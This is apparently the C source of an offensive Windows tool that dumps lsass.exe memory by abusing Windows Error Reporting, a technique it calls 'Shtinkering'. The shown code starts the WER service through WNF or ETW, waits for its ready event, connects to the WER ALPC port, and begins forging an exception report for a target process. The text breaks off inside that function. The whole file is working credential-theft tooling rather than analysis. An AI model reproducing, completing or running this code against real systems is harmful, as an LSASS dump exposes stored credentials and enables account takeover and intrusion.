/*****************************************************************************************************
*                                                                                                    *
*  File:         DumpShtinkering.c                                                                   *
*  Purpose:      Performs an lsass.exe Shtinkering (by abusing WER).                                 *
*                                                                                                    *
******************************************************************************************************/
#include "DumpShtinkering.h"
#include "Common.h"
#include <evntprov.h>
#include <winternl.h>
#include <strsafe.h>

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    CRASH_DUMPS_DIRECTORY                                                                *
*  Purpose:     The crash dumps directory.                                                           *
*                                                                                                    *
******************************************************************************************************/
#define CRASH_DUMPS_DIRECTORY (L"%LocalAppData%\\CrashDumps")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    WNF_WER_SERVICE_START                                                                *
*  Purpose:     The state name for WNF to make WER start.                                            *
*                                                                                                    *
******************************************************************************************************/
#define WNF_WER_SERVICE_START ((ULONGLONG)(0x41940B3AA3BC0875))

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    WER_READY_EVENT_NAME                                                                 *
*  Purpose:     The event name that indicates WER is ready.                                          *
*                                                                                                    *
******************************************************************************************************/
#define WER_READY_EVENT_NAME (L"\\KernelObjects\\SystemErrorPortReady")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    ALPC_WER_PORT_STRING                                                                 *
*  Purpose:     The ALPC port name for WER.                                                          *
*                                                                                                    *
******************************************************************************************************/
#define ALPC_WER_PORT_STRING (L"\\WindowsErrorReportingServicePort")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    EVENT_QUERY_STATE                                                                    *
*  Purpose:     A flag for NtOpenEvent to enable event state queries.                                *
*                                                                                                    *
******************************************************************************************************/
#define EVENT_QUERY_STATE (0x0001)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    ALPC_MSGFLG_SYNC_REQUEST                                                             *
*  Purpose:     The ALPC message flags for synchronization requests.                                 *
*                                                                                                    *
******************************************************************************************************/
#define ALPC_MSGFLG_SYNC_REQUEST (0x20000)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    WER_SVC_MESSAGE_ID_REQUEST_REPORT_UNHANDLED_EXCEPTION                                *
*  Purpose:     The WER message ID to report an unhandled exception.                                 *
*                                                                                                    *
******************************************************************************************************/
#define WER_SVC_MESSAGE_ID_REQUEST_REPORT_UNHANDLED_EXCEPTION (0x20000000)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    WER_SVC_MESSAGE_ID_REPLY_REPORT_UNHANDLED_EXCEPTION_FAILURE                          *
*  Purpose:     The WER message ID used to reply to an unhandled exception.                          *
*                                                                                                    *
******************************************************************************************************/
#define WER_SVC_MESSAGE_ID_REPLY_REPORT_UNHANDLED_EXCEPTION_FAILURE (0x20000002)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    STATUS_ALERTED                                                                       *
*  Purpose:     An NTSTATUS that indicates an alerted APC.                                           *
*  Remarks:     - Done here to avoid including ntstatus.h which includes many type redefinitions.    *
*                                                                                                    *
******************************************************************************************************/
#ifndef STATUS_ALERTED
#define STATUS_ALERTED ((NTSTATUS)0x00000101L)
#endif

/*****************************************************************************************************
*                                                                                                    *
*  Type:         LOGICAL                                                                             *
*  Purpose:      Defines a LOGICAL (used later for WNF check stamps).                                *
*                                                                                                    *
******************************************************************************************************/
typedef ULONG LOGICAL;

/*****************************************************************************************************
*                                                                                                    *
*  Type:         WNF_CHANGE_STAMP                                                                    *
*  Purpose:      Defines a check stamp type for WNF.                                                 *
*                                                                                                    *
******************************************************************************************************/
typedef ULONG WNF_CHANGE_STAMP, *PWNF_CHANGE_STAMP;

/*****************************************************************************************************
*                                                                                                    *
*  Type:         CSHORT                                                                              *
*  Purpose:      Defines a C-style short (used later for port messages).                             *
*                                                                                                    *
******************************************************************************************************/
typedef short CSHORT;

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    WNF_TYPE_ID                                                                         *
*  Purpose:      Defines a WNF type ID.                                                              *
*                                                                                                    *
******************************************************************************************************/
typedef struct _WNF_TYPE_ID
{
    GUID tTypeId;
} WNF_TYPE_ID, * PWNF_TYPE_ID;

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    QUAD                                                                                *
*  Purpose:      Defines generic 4-byte field (not documented, taken from ntbasic.h).                *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:4201)
typedef struct _QUAD
{
    union
    {
        INT64 UseThisFieldToCopy;
        float DoNotUseThisField;
    };
} QUAD, *PQUAD;
#pragma warning(pop)

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    PORT_MESSAGE                                                                        *
*  Purpose:      Defines a port message (not documented, taken from ntlpcapi.h).                     *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:4201)
typedef struct _PORT_MESSAGE
{
    union
    {
        struct
        {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union
    {
        struct
        {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union
    {
        CLIENT_ID ClientId;
        QUAD DoNotUseThisField;
    };
    ULONG MessageId;
    union
    {
        SIZE_T ClientViewSize;
        ULONG CallbackId;
    };
} PORT_MESSAGE, *PPORT_MESSAGE;
#pragma warning(pop)

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    ALPC_PORT_ATTRIBUTES                                                                *
*  Purpose:      Defines an ALPC port attributes (not documented, taken from ntlpcapi.h).            *
*                                                                                                    *
******************************************************************************************************/
typedef struct _ALPC_PORT_ATTRIBUTES
{
    ULONG Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    SIZE_T MaxMessageLength;
    SIZE_T MemoryBandwidth;
    SIZE_T MaxPoolUsage;
    SIZE_T MaxSectionSize;
    SIZE_T MaxViewSize;
    SIZE_T MaxTotalSectionSize;
    ULONG DupObjectTypes;
#ifdef _WIN64
    ULONG Reserved;
#endif
} ALPC_PORT_ATTRIBUTES, *PALPC_PORT_ATTRIBUTES;

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    ALPC_MESSAGE_ATTRIBUTES                                                             *
*  Purpose:      Defines an ALPC message attributes (not documented, taken from ntlpcapi.h).         *
*                                                                                                    *
******************************************************************************************************/
typedef struct _ALPC_MESSAGE_ATTRIBUTES
{
    ULONG AllocatedAttributes;
    ULONG ValidAttributes;
} ALPC_MESSAGE_ATTRIBUTES, *PALPC_MESSAGE_ATTRIBUTES;

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    REPORT_EXCEPTION_WER_ALPC_MESSAGE                                                   *
*  Purpose:      ALPC exception report messages to WER (not documented).                             *
*                                                                                                    *
******************************************************************************************************/
typedef struct _REPORT_EXCEPTION_WER_ALPC_MESSAGE
{
    PORT_MESSAGE PortMessage;
    DWORD MessageType;
    NTSTATUS NtStatusErrorCode;
    DWORD Flags;
    DWORD TargetProcessId;
    HANDLE hFileMapping;
#ifndef _WIN64
    DWORD Filler0;
#endif
    HANDLE hRecoveryEvent;
#ifndef _WIN64
    DWORD Filler1;
#endif
    HANDLE hCompletionEvent;
#ifndef _WIN64
    DWORD Filler2;
#endif
    HANDLE hFileMapping2;
#ifndef _WIN64
    DWORD Filler3;
#endif
    HANDLE hTargetProcess;
#ifndef _WIN64
    DWORD Filler4;
#endif
    HANDLE hTargetThread;
#ifndef _WIN64
    DWORD Filler5;
#endif
    DWORD Filler6[324];
} REPORT_EXCEPTION_WER_ALPC_MESSAGE, *PREPORT_EXCEPTION_WER_ALPC_MESSAGE;

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    MAPPED_VIEW_STRUCT                                                                  *
*  Purpose:      The structure used to maintain exception information in memory (not documented).    *
*                                                                                                    *
******************************************************************************************************/
typedef struct _MAPPED_VIEW_STRUCT
{
    DWORD Size;
    DWORD TargetProcessPid;
    DWORD TargetThreadTid;
    DWORD Filler0[39];
    PEXCEPTION_POINTERS ExceptionPointers;
#ifndef _WIN64
    DWORD Filler1;
#endif
    DWORD NtErrorCode;
    DWORD Filler2;
    HANDLE hTargetProcess;
#ifndef _WIN64
    DWORD Filler3;
#endif
    HANDLE hTargetThread;
#ifndef _WIN64
    DWORD Filler4;
#endif
    HANDLE hRecoveryEvent;
#ifndef _WIN64
    DWORD Filler5;
#endif
    HANDLE hCompletionEvent;
#ifndef _WIN64
    DWORD Filler6;
#endif
    DWORD Filler7;
    DWORD Filler8;
    DWORD Null01;
    DWORD Null02;
    DWORD NtStatusErrorCode;
    DWORD Null03;
    DWORD TickCount;
    DWORD Unk101;
} MAPPED_VIEW_STRUCT, *PMAPPED_VIEW_STRUCT;


/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_RtlInitUnicodeString                                                            *
*  Purpose:      Defines the function prototype for ntdll!RtlInitUnicodeString.                      *
*  Parameters:   - ptDestinationString - the destination string.                                     *
*                - pwszSourceString - the source string.                                             *
*                                                                                                    *
******************************************************************************************************/
typedef VOID(* PFN_RtlInitUnicodeString)(
    __out PUNICODE_STRING ptDestinationString,
    __in __notnull PWSTR pwszSourceString
);

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_NtUpdateWnfStateData                                                            *
*  Purpose:      Defines the function prototype for ntdll!NtUpdateWnfStateData.                      *
*  Parameters:   - pvStateName - the state name.                                                     *
*                - pvBuffer - the buffer.                                                            *
*                - cbLength - the buffer's length in bytes.                                          *
*                - ptTypeId - the WNF type.                                                          *
*                - pvExplicitScope - explicit scope.                                                 *
*                  - dwMatchingChangeStamp - the matching change stamp.                                *
*                - dwCheckStamp - the check stamp.                                                   *
* Returns:      A status indicating success or failure.                                              *
*                                                                                                    *
******************************************************************************************************/
typedef __success(return >= 0) NTSTATUS(NTAPI* PFN_NtUpdateWnfStateData)(
    __in_opt PVOID pvStateName,
    __in_bcount_opt(cbLength) PVOID pvBuffer,
    __in ULONG cbLength,
    __in_opt PWNF_TYPE_ID ptTypeId,
    __in_opt PVOID pvExplicitScope,
    __in WNF_CHANGE_STAMP dwMatchingChangeStamp,
    __in LOGICAL dwCheckStamp
);

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_NtUpdateWnfStateData                                                            *
*  Purpose:      Defines the function prototype for ntdll!EtwEventWriteNoRegistration.               *
*  Parameters:   - ptProviderId - the provider GUID.                                                 *
*                - ptEventDescriptor - the event descriptor.                                         *
*                - cbLength - the buffer's length in bytes.                                          *
*                - dwUserDataCount - the number of user data entries.                                 *
*                - ptUserData - the user data entries.                                                 *
*  Returns:      A status indicating success or failure.                                             *
*                                                                                                    *
******************************************************************************************************/
typedef __success(return == 0) ULONG(WINAPI* PFN_EtwEventWriteNoRegistration)(
    __in __notnull GUID* ptProviderId,
    __in __notnull PCEVENT_DESCRIPTOR ptEventDescriptor,
    __in ULONG dwUserDataCount,
    __in_opt PEVENT_DATA_DESCRIPTOR ptUserData
);

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_NtOpenEvent                                                                     *
*  Purpose:      Defines the function prototype for ntdll!NtOpenEvent.                               *
*  Parameters:   - phEventHandle - gets the event handle.                                            *
*                - dwDesiredAccess - the desired access.                                             *
*                  - ptObjectAttributes - the object attributes.                                       *
*  Returns:      A status indicating success or failure.                                             *
*  Remarks:         - Close returned handle with ntdll!NtClose.                                         *
*                                                                                                    *
******************************************************************************************************/
typedef __success(return >= 0) NTSTATUS(NTAPI* PFN_NtOpenEvent)(
    __out PHANDLE phEventHandle,
    __in ACCESS_MASK dwDesiredAccess,
    __in_opt POBJECT_ATTRIBUTES ptObjectAttributes
);

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_NtWaitForSingleObject                                                           *
*  Purpose:      Defines the function prototype for ntdll!NtWaitForSingleObject.                     *
*  Parameters:   - hHandle - gets the handle to wait on.                                             *
*                - bAlertable - whether the thread is alertable.                                     *
*                 - ptTimeout - the timeout.                                                          *
*  Returns:      A status indicating success or failure.                                             *
*                                                                                                    *
******************************************************************************************************/
typedef __success(return >= 0) NTSTATUS(NTAPI* PFN_NtWaitForSingleObject)(
    __in __notnull HANDLE hHandle,
    __in BOOLEAN bAlertable,
    __in_opt PLARGE_INTEGER ptTimeout
);

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_NtClose                                                                         *
*  Purpose:      Defines the function prototype for ntdll!NtClose.                                   *
*  Parameters:   - hHandle - the handle to close.                                                    *
*  Returns:      A status indicating success or failure.                                             *
*                                                                                                    *
******************************************************************************************************/
typedef __success(return >= 0) NTSTATUS(NTAPI* PFN_NtClose)(
    __in __notnull HANDLE hHandle
);

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_NtAlpcSendWaitReceivePort                                                       *
*  Purpose:      Defines the function prototype for ntdll!NtAlpcSendWaitReceivePort.                 *
*  Parameters:   - hPortHandle - the port handle.                                                    *
*                - dwFlags - ALPC flags.                                                             *
*                  - ptSendingMessage - the sending message.                                           *
*                 - ptSendingMessageAttributes - the sending message attributes.                      *
*                  - ptReceiveMessage - the receiving message.                                         *
*                  - cbBufferLength - the buffer length for the message.                               *
*                 - ptReceiveMessageAttributes - the receiving message attributes.                    *
*                - ptTimeout - the timeout.                                                          *
* Returns:      A status indicating success or failure.                                              *
*                                                                                                    *
******************************************************************************************************/
typedef __success(return >= 0) NTSTATUS(WINAPI* PFN_NtAlpcSendWaitReceivePort)(
    __in __notnull HANDLE hPortHandle,
    __in ULONG dwFlags,
    __in_opt PPORT_MESSAGE ptSendingMessage,
    __in_opt PALPC_MESSAGE_ATTRIBUTES ptSendingMessageAttributes,
    __in_opt PPORT_MESSAGE ptReceiveMessage,
    __inout_opt PSIZE_T cbBufferLength,
    __inout_opt PALPC_MESSAGE_ATTRIBUTES ptReceiveMessageAttributes,
    __in_opt PLARGE_INTEGER ptTimeout
);

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_NtAlpcConnectPort                                                               *
*  Purpose:      Defines the function prototype for ntdll!NtAlpcConnectPort.                         *
*  Parameters:   - phPortHandle - gets the port handle.                                              *
*                - ptPortName - the port name.                                                       *
*                 - ptObjectAttributes - the object attributes.                                       *
*                - ptPortAttributes - the port attributes.                                           *
*                 - dwFlags - ALPC flags.                                                             *
*                 - ptRequiredServerSid - the server SID.                                             *
*                - ptConnectionMessage - the connection message.                                     *
*                 - pcbBufferLength - the buffer length for the message.                              *
*                 - ptOutMessageAttributes - the outgoing mesage attributes.                          *
*                 - ptInMessageAttributes - the incoming mesage attributes.                           *
*                 - ptTimeout - the timeout.                                                          *
*  Returns:      A status indicating success or failure.                                             *
*                                                                                                    *
******************************************************************************************************/
typedef __success(return >= 0) NTSTATUS(WINAPI* PFN_NtAlpcConnectPort)(
    __out PHANDLE phPortHandle,
    __in __notnull PUNICODE_STRING ptPortName,
    __in_opt POBJECT_ATTRIBUTES ptObjectAttributes,
    __in_opt PALPC_PORT_ATTRIBUTES ptPortAttributes,
    __in ULONG dwFlags,
    __in_opt PSID ptRequiredServerSid,
    __in_opt PPORT_MESSAGE ptConnectionMessage,
    __inout_opt PULONG pcbBufferLength,
    __inout_opt PALPC_MESSAGE_ATTRIBUTES ptOutMessageAttributes,
    __inout_opt PALPC_MESSAGE_ATTRIBUTES ptInMessageAttributes,
    __in_opt PLARGE_INTEGER ptTimeout
);

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpshtinkering_SignalStartWerSvc                                                   *
*  Purpose:      Signals the OS to start the WER service.                                            *
*  Returns:      A return status.                                                                    *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
dumpshtinkering_SignalStartWerSvc(VOID)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    NTSTATUS eNtStatus = STATUS_UNSUCCESSFUL;
    PFN_NtUpdateWnfStateData pfnNtUpdateWnfStateData = NULL;
    PFN_EtwEventWriteNoRegistration pfnEtwEventWriteNoRegistration = NULL;
    ULONGLONG qwWnfWerServiceStart = WNF_WER_SERVICE_START;
    GUID tFeedbackServiceTriggerProviderGuid = { 0xe46eead8, 0xc54, 0x4489, {0x98, 0x98, 0x8f, 0xa7, 0x9d, 0x5, 0x9e, 0xe} };
    EVENT_DESCRIPTOR tEventDescriptor = { 0 };
    DWORD dwErrorCode = ERROR_SUCCESS;

    // Either work with ntdll!NtUpdateWnfStateData or ntdll!EtwEventWriteNoRegistration
    eStatus = COMMON_ResolveProcAddress(L"ntdll.dll", "NtUpdateWnfStateData", (FARPROC*)&pfnNtUpdateWnfStateData);
    if (RETSTATUS_SUCCEEDED(eStatus))
    {
        eNtStatus = pfnNtUpdateWnfStateData(&qwWnfWerServiceStart, NULL, 0, NULL, NULL, 0, 0);
        if (!NT_SUCCESS(eNtStatus))
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"NtUpdateWnfStateData() failed (eNtStatus=%lu)", eNtStatus);
            goto lblCleanup;
        }
    }
    else
    {
        // Works for older OS versions
        eStatus = COMMON_ResolveProcAddress(L"ntdll.dll", "EtwEventWriteNoRegistration", (FARPROC*)&pfnEtwEventWriteNoRegistration);
        if (RETSTATUS_FAILED(eStatus))
        {
            DEBUG_MSG(L"COMMON_ResolveProcAddress failed - could not resolve both ntdll!NtUpdateWnfStateData and ntdll!EtwEventWriteNoRegistration (eStatus=%.8x)", eStatus);
            goto lblCleanup;
        }

        // Use ETW
        dwErrorCode = pfnEtwEventWriteNoRegistration(&tFeedbackServiceTriggerProviderGuid, &tEventDescriptor, 0, NULL);
        if (ERROR_SUCCESS != dwErrorCode)
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"EtwEventWriteNoRegistration() failed (dwErrorCode=%lu)", dwErrorCode);
            goto lblCleanup;
        }
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpshtinkering_WaitForWerSvc                                                       *
*  Purpose:      Waits for the WER service to start.                                                 *
*  Returns:      A return status.                                                                    *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:6011)
__success(return >= 0)
static
RETSTATUS
dumpshtinkering_WaitForWerSvc(VOID)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    UNICODE_STRING tObjectName = { 0 };
    OBJECT_ATTRIBUTES tObjectAttributes;
    PWSTR pwszEventName = WER_READY_EVENT_NAME;
    HANDLE hEvent = NULL;
    NTSTATUS eNtStatus = STATUS_UNSUCCESSFUL;
    PFN_NtOpenEvent pfnNtOpenEvent = NULL;
    PFN_NtWaitForSingleObject pfnNtWaitForSingleObject = NULL;
    PFN_NtClose pfnNtClose = NULL;
    PSTR apszProcNames[] = { "NtOpenEvent", "NtWaitForSingleObject", "NtClose" };
    FARPROC* appfnProcs[] = { (FARPROC*)&pfnNtOpenEvent, (FARPROC*)&pfnNtWaitForSingleObject, (FARPROC*)&pfnNtClose };

    // Resolve ntdll.dll symbols
    COMPILE_TIME_ASSERT(ARRAYSIZE(apszProcNames) == ARRAYSIZE(appfnProcs));
    eStatus = COMMON_ResolveProcAddresses(L"ntdll.dll", apszProcNames, appfnProcs, ARRAYSIZE(appfnProcs));
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_ResolveProcAddresses failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Define the object name
    tObjectName.Buffer = pwszEventName;
    tObjectName.Length = (USHORT)(wcslen(pwszEventName) * sizeof(*pwszEventName));
    tObjectName.MaximumLength = tObjectName.Length + sizeof(*pwszEventName);

    // Build the object attributes    
    tObjectAttributes.ObjectName = &tObjectName;
    tObjectAttributes.Length = sizeof(tObjectAttributes);
    tObjectAttributes.RootDirectory = NULL;
    tObjectAttributes.Attributes = 0;
    tObjectAttributes.SecurityDescriptor = NULL;
    tObjectAttributes.SecurityQualityOfService = NULL;

    // Open the event
    eNtStatus = pfnNtOpenEvent(&hEvent, EVENT_QUERY_STATE | SYNCHRONIZE, &tObjectAttributes);
    if (!NT_SUCCESS(eNtStatus))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"NtOpenEvent() failed (eNtStatus=%lu)", eNtStatus);
        goto lblCleanup;
    }

    // Wait for the event
    eNtStatus = pfnNtWaitForSingleObject(hEvent, FALSE, NULL);
    if (!NT_SUCCESS(eNtStatus))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"NtWaitForSingleObject() failed (eNtStatus=%lu)", eNtStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:
    
    // Free resources
    if ((NULL != hEvent) && (NULL != pfnNtClose))
    {
        (VOID)pfnNtClose(hEvent);
        hEvent = NULL;
    }

    // Return result
    return eStatus;
}
#pragma warning(pop)

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpshtinkering_SendMessageToWerService                                             *
*  Purpose:      Sends an ALPC message to WER.                                                       *
*  Parmaeters:     - ptSendingMessage - the sending message.                                             *
*                 - ptReceivingMessage - the receiving message.                                         *
*  Returns:      A return status.                                                                    *
*  Remarks:        - Receiving message might be assigned to even upon failure.                             *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:6011)
__success(return >= 0)
static
RETSTATUS
dumpshtinkering_SendMessageToWerService(
    __in __notnull PREPORT_EXCEPTION_WER_ALPC_MESSAGE ptSendingMessage,
    __inout PREPORT_EXCEPTION_WER_ALPC_MESSAGE ptReceivingMessage
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    NTSTATUS eNtStatus = STATUS_UNSUCCESSFUL;
    PFN_RtlInitUnicodeString pfnRtlInitUnicodeString = NULL;
    PFN_NtAlpcConnectPort pfnNtAlpcConnectPort = NULL;
    PFN_NtAlpcSendWaitReceivePort pfnNtAlpcSendWaitReceivePort = NULL;
    PFN_NtClose pfnNtClose = NULL;
    PSTR apszProcNames[] = { "RtlInitUnicodeString", "ZwAlpcConnectPort", "NtAlpcSendWaitReceivePort", "NtClose" };
    FARPROC* appfnProcs[] = { (FARPROC*)&pfnRtlInitUnicodeString, (FARPROC*)&pfnNtAlpcConnectPort, (FARPROC*)&pfnNtAlpcSendWaitReceivePort, (FARPROC*)&pfnNtClose };
    UNICODE_STRING tAlpcWerPortString = { 0 };
    OBJECT_ATTRIBUTES tObjectAttributes = { 0 };
    HANDLE hPortHandle = NULL;
    ALPC_PORT_ATTRIBUTES tPortAttributes = { 0 };
    SIZE_T cbBufferLength = 0;

    // Validate arguments
    DEBUG_ASSERT(NULL != ptSendingMessage);
    DEBUG_ASSERT(NULL != ptReceivingMessage);
    
    // Resolve ntdll.dll symbols
    COMPILE_TIME_ASSERT(ARRAYSIZE(apszProcNames) == ARRAYSIZE(appfnProcs));
    eStatus = COMMON_ResolveProcAddresses(L"ntdll.dll", apszProcNames, appfnProcs, ARRAYSIZE(appfnProcs));
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_ResolveProcAddresses failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Signal to start the WER service
    eStatus = dumpshtinkering_SignalStartWerSvc();
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"SignalStartWerSvc failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Wait for WER to start
    eStatus = dumpshtinkering_WaitForWerSvc();
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"WaitForWerSvc failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Build the object attributes
    pfnRtlInitUnicodeString(&tAlpcWerPortString, ALPC_WER_PORT_STRING);
    tObjectAttributes.Length = sizeof(tObjectAttributes);
    tObjectAttributes.RootDirectory = NULL;
    tObjectAttributes.Attributes = 0;
    tObjectAttributes.ObjectName = NULL;
    tObjectAttributes.SecurityDescriptor = NULL;
    tObjectAttributes.SecurityQualityOfService = NULL;

    // Build the port attributes and connect
    tPortAttributes.MaxMessageLength = sizeof(*ptReceivingMessage);
    eNtStatus = pfnNtAlpcConnectPort(&hPortHandle,
        &tAlpcWerPortString,
        &tObjectAttributes,
        &tPortAttributes,
        ALPC_MSGFLG_SYNC_REQUEST,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);
    if (!NT_SUCCESS(eNtStatus))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"NtAlpcConnectPort() failed (eNtStatus=%lu)", eNtStatus);
        goto lblCleanup;
    }

    // Send a synchronization request
    cbBufferLength = sizeof(*ptReceivingMessage);
    eNtStatus = pfnNtAlpcSendWaitReceivePort(hPortHandle,
        ALPC_MSGFLG_SYNC_REQUEST,
        (PPORT_MESSAGE)ptSendingMessage, 
        NULL,
        (PPORT_MESSAGE)ptReceivingMessage,
        &cbBufferLength,
        NULL,
        NULL);
    if (!NT_SUCCESS(eNtStatus))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"NtAlpcSendWaitReceivePort() failed (eNtStatus=%lu)", eNtStatus);
        goto lblCleanup;
    }

    // Check for a timeout
    if (STATUS_TIMEOUT == eNtStatus)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"NtAlpcSendWaitReceivePort() timed-out");
        goto lblCleanup;
    }

    // Check the status from the call
    eNtStatus = ptReceivingMessage->NtStatusErrorCode;
    if (!NT_SUCCESS(eNtStatus))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Receiving message indicates a failure (eNtStatus=%lu)", eNtStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:
    
    // Free resources
    if ((NULL != hPortHandle) && (NULL != pfnNtClose))
    {
        (VOID)pfnNtClose(hPortHandle);
        hPortHandle = NULL;
    }

    // Return result
    return eStatus;
}
#pragma warning(pop)

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpshtinkering_ReportExceptionToWer                                                *
*  Purpose:      Reports an exception to WER.                                                        *
*  Parmaeters:     - dwProcessPid - the process ID to use.                                              *
*                  - hProcessHandle - the process handle to use.                                         *
*  Returns:      TRUE upon success, FALSE otherwise.                                                 *
*  Remarks:         - Receiving message might be assigned to even upon failure.                         *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
dumpshtinkering_ReportExceptionToWer(
    __in DWORD dwProcessPid,
    __in __notnull HANDLE hProcessHandle
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    EXCEPTION_RECORD tExceptionRecord = { 0 };
    EXCEPTION_POINTERS tExceptionPointers = { 0 };
    CONTEXT tContext = { 0 };
    SECURITY_ATTRIBUTES tSecurityAttrs = { 0 };
    HANDLE hRecoveryEvent = NULL;
    HANDLE hCompletionEvent = NULL;
    HANDLE hFileMapping = NULL;
    REPORT_EXCEPTION_WER_ALPC_MESSAGE tSendingMessage = { 0 };
    REPORT_EXCEPTION_WER_ALPC_MESSAGE tReceivingMessage = { 0 };
    PMAPPED_VIEW_STRUCT ptMappedView = NULL;
    DWORD dwFirstThreadId = 0;
    HANDLE hFirstThread = NULL;
    HANDLE hWerProcess = NULL;
    NTSTATUS eNtStatus = STATUS_UNSUCCESSFUL;
    PFN_NtWaitForSingleObject pfnNtWaitForSingleObject = NULL;

    // Validate arguments
    DEBUG_ASSERT(NULL != hProcessHandle);

    // Resolve ntdll.dll symbols
    eStatus = COMMON_ResolveProcAddress(L"ntdll.dll", "NtWaitForSingleObject", (FARPROC*)&pfnNtWaitForSingleObject);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_ResolveProcAddress failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Prepare exception details
    tExceptionRecord.ExceptionCode = (DWORD)STATUS_UNSUCCESSFUL;
    tExceptionPointers.ExceptionRecord = &tExceptionRecord;
    tExceptionPointers.ContextRecord = &tContext;

    // Prepare the security attributes for objects
    tSecurityAttrs.nLength = sizeof(tSecurityAttrs);
    tSecurityAttrs.lpSecurityDescriptor = NULL;
    tSecurityAttrs.bInheritHandle = TRUE;

    // Open the first thread
    eStatus = COMMON_GetFirstThreadOfProcess(&dwFirstThreadId, dwProcessPid);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_GetFirstThreadOfProcess failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Open the first thread
    hFirstThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, TRUE, dwFirstThreadId);
    if (NULL == hFirstThread)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"OpenThread() failed (dwFirstThreadId=%lu, LastError=%lu)", dwFirstThreadId, GetLastError());
        goto lblCleanup;
    }
    
    // Create the recovery event
    hRecoveryEvent = CreateEventW(&tSecurityAttrs, TRUE, 0, NULL);
    if (NULL == hRecoveryEvent)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CreateEventW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Create the completion event
    hCompletionEvent = CreateEventW(&tSecurityAttrs, TRUE, 0, NULL);
    if (NULL == hCompletionEvent)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CreateEventW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Create a file mapping handle
    hFileMapping = CreateFileMappingW(GetCurrentProcess(), &tSecurityAttrs, PAGE_READWRITE, 0, sizeof(*ptMappedView), NULL);
    if (NULL == hFileMapping)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CreateFileMappingW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Map to memory
    ptMappedView = (PMAPPED_VIEW_STRUCT)MapViewOfFile(hFileMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    if (NULL == ptMappedView)
    {
